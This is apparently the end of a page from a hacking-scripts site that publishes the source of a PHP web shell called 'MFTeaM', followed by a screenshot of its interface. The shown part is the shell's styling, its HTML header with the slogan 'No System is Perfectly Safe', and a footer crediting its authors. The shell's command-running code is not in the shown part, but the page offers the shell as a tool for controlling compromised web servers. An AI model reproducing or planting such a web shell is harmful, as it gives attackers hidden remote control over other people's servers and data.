.bartitle,input,select,option,input[type="submit"]:hover,input[type="button"]:hover {background-color:#333333;}
textarea,#pagebar input[type="text"],.mainpanel input[type="text"],input[type="file"],select,option {background-color:#000000;}
input[type="label"] { text-align:right;}
.info,.info td,input[type="label"] {border:0;background:none;}
&lt;/style&gt;
';
$html_start = '
&lt;html&gt;&lt;head&gt;
&lt;title&gt;'.getenv("HTTP_HOST").' - '.sh_name().'&lt;/title&gt;
'.$style.'
&lt;/head&gt;
&lt;body&gt;
&lt;div class=bartitle&gt;&lt;h4&gt;'.sh_name().'&lt;/h4&gt;.: No System is Perfectly Safe :.&lt;/div&gt;
';
return $html_start;
};
function footer() {
  echo "&lt;div class=bartitle colspan=2&gt;&lt;font size=1 color=#00FF00&gt; By FakoMast3r,   2009 Midnightcr3w, Generated: ".round(getmicrotime()-starttime,4)." seconds&lt;/font&gt;&lt;/div&gt;";
}
chdir($lastdir); exshexit();
?&gt;
</pre>

A screenshot of the MFTeaM shell:  
<figure id="attachment_395" style="width: 604px;" class="wp-caption aligncenter">[<img src="http://hackingscripts.com/wp/wp-content/uploads/2014/03/MFTeaM-1024x575.png" alt="MFTeaM shell screenshot" width="604" height="339" class="size-large wp-image-395" />][1]<figcaption class="wp-caption-text">MFTeaM shell screenshot</figcaption></figure>

 [1]: http://hackingscripts.com/wp/wp-content/uploads/2014/03/MFTeaM.png